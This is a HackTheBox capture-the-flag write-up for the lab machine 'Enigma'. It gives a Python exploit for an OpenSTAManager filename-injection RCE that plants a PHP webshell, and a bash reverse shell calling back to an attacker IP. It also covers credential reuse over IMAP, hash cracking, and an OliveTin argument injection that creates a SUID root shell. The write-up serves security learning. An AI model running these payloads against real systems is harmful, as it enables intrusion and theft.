# Enigma — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

---

## Overview

Enigma is an Easy Linux box built around a corporate IT environment. The chain: NFS world-readable share → onboarding PDF with credentials → webmail pivot → IMAP enumeration to get support portal creds → OpenSTAManager CVE-2025-69212 (P7M ZIP filename injection RCE) → www-data shell → DB creds → bcrypt hash crack → haris → OliveTin `password`-type argument injection → SUID bash → root.

**Machine IP:** `<TARGET_IP>`  
**My IP:** `<ATTACKER_IP>`

---

## Recon

```bash
nmap -A -sC -Pn -v <TARGET_IP>
```

Open ports: 22, 80 (nginx — Enigma Corp), 110/995 (POP3), 143/993 (IMAP), 111 (rpcbind), 2049 (NFS).

NFS and a mail stack standing together is a strong signal — start with the share.

---

## NFS Enumeration

```bash
showmount -e <TARGET_IP>
# /srv/nfs/onboarding *

mkdir /mnt/enigma
mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /mnt/enigma
pdftotext /mnt/enigma/New_Employee_Access.pdf -
```

Credentials in the PDF:

```
Webmail : http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

---

## Webmail Pivot → IMAP

Added `mail001.enigma.htb` to `/etc/hosts`, logged into Roundcube as kevin. One email from `sarah@enigma.htb` mentioning credentials would arrive via the company shared drive. SSH had key-only auth so password spraying there was dead — but IMAP worked:

```bash
openssl s_client -connect <TARGET_IP>:993 -quiet
a1 LOGIN sarah Enigma2024!
a2 SELECT INBOX
a3 FETCH 1:* (BODY[TEXT])
```

IT email in Sarah's inbox:

```
URL     : http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

---

## RCE — CVE-2025-69212 (OpenSTAManager P7M Injection)

The support portal ran **OpenSTAManager v2.9.8**. The P7M file decoding in `src/Util/XML.php` passes ZIP-extracted filenames directly into `exec()` without sanitisation — classic filename injection.

```python
import zipfile

cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

Upload via **Purchases → Purchase invoices → Electronic invoicing → Charge supplier document**. Server throws a 500 (expected — XML parsing fails after execution), but the webshell is already there:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data) gid=33(www-data)
```

Reverse shell:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'"
nc -lvnp 4444
```

---

## Lateral Movement — www-data → haris

DB creds in the config:

```bash
cat ~/html/openstamanager/config.inc.php
# $db_username = 'brollin'
# $db_password = 'Fri3nds@9099'
```

Extract hashes:

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"
```

Crack haris's bcrypt:

```bash
hashcat -m 3200 '<haris_hash>' /usr/share/wordlists/rockyou.txt
# bestfriends
```

```bash
su - haris
# Password: bestfriends
cat user.txt
```

---

## Privilege Escalation — haris → root (OliveTin)

OliveTin running as root on `127.0.0.1:1337`. Config at `/etc/OliveTin/config.yaml` had `authRequireGuestsToLogin: false` and `defaultPermissions.exec: true` — no auth.

A **Backup Database** action used a `db_pass` argument of type `password`. Unlike `ascii_identifier` which sanitises input, `password` type passes raw user input directly into the shell command:

```yaml
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

Inject through the single-quote boundary:

```bash
cat > /tmp/p.json << 'PAYLOAD'
{"bindingId":"backup_database","arguments":[
  {"name":"db_user","value":"backup_svc"},
  {"name":"db_pass","value":"x';cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash;echo '"},
  {"name":"db_name","value":"production"}
]}
PAYLOAD

curl -s -X POST http://127.0.0.1:1337/api/StartAction --json @/tmp/p.json
sleep 3
/tmp/rootbash -p
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Things I Learned

**NFS world-readable exports are free loot** — always run `showmount -e` early. Companies putting onboarding docs on NFS with `*` ACL is a real-world finding.

**IMAP as a pivot** — when SSH is key-only, try the same passwords against mail services. People reuse credentials and IMAP gives you inbox access which often has internal URLs and secondary creds.

**P7M filename injection** — the vuln works because the ZIP entry name is used directly in `exec()`. Whenever an app processes archive contents and passes extracted names to shell, check if the name is sanitised. The double-quote escape `";cmd;echo "` is the classic break-out pattern here.

**OliveTin `password` type** — OliveTin's argument types matter for security. `ascii_identifier` restricts chars; `password` doesn't. If you see OliveTin with shell commands and `password`-type args, single-quote injection is almost always viable.

---

*Pexpo | HTB | Aug 2026*
